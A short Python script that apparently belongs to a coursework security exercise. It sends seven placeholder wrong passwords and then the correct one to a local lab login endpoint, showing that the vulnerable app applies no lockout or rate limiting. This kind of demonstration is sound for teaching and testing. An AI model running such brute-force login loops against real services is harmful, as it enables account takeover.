"""
CW1 attack script for VULN-01.

Shows that repeated wrong passwords keep returning HTTP 401 and that no
lockout or rate limiting is applied in the vulnerable version.
"""

from __future__ import annotations

import time

import requests

BASE_URL = "http://127.0.0.1:5000"
TARGET_USERNAME = "alice"
CORRECT_PASSWORD = "password123"
WRONG_PASSWORDS = [
    "wrong1",
    "wrong2",
    "wrong3",
    "wrong4",
    "wrong5",
    "wrong6",
    "wrong7",
]
DELAY_BETWEEN_REQUESTS = 0.3
SEPARATOR = "=" * 72


def post_login(username: str, password: str) -> requests.Response:
    return requests.post(
        f"{BASE_URL}/login",
        json={"username": username, "password": password},
        timeout=5,
    )


def heading(title: str) -> None:
    print()
    print(SEPARATOR)
    print(f"  {title}")
    print(SEPARATOR)


def divider() -> None:
    print("-" * 72)


def main() -> None:
    print(SEPARATOR)
    print("  CW1 VULN-01 Attack - Brute Force Without Lockout")
    print(f"  Target : {BASE_URL}")
    print(f"  User   : {TARGET_USERNAME}")
    print("  Expect : repeated HTTP 401 responses with no HTTP 429")
    print(SEPARATOR)

    heading("PHASE 1 - Wrong password spray")
    print(f"  {'#':<4} {'Password':<14} {'HTTP':<6} Response")
    divider()

    for index, password in enumerate(WRONG_PASSWORDS, start=1):
        response = post_login(TARGET_USERNAME, password)
        try:
            body = response.json()
        except ValueError:
            body = {"raw": response.text}
        message = body.get("message", body.get("error", body.get("raw", "")))
        print(f"  {index:<4} {password:<14} {response.status_code:<6} {message}")
        time.sleep(DELAY_BETWEEN_REQUESTS)

    heading("PHASE 2 - Correct password still succeeds")
    response = post_login(TARGET_USERNAME, CORRECT_PASSWORD)
    try:
        body = response.json()
    except ValueError:
        body = {"raw": response.text}
    message = body.get("message", body.get("error", body.get("raw", "")))
    print(f"  {'8':<4} {CORRECT_PASSWORD:<14} {response.status_code:<6} {message}")

    heading("SUMMARY")
    print("  CW1 keeps accepting login attempts with no lockout window.")
    print("  A practical brute-force attacker can continue indefinitely.")


if __name__ == "__main__":
    main()
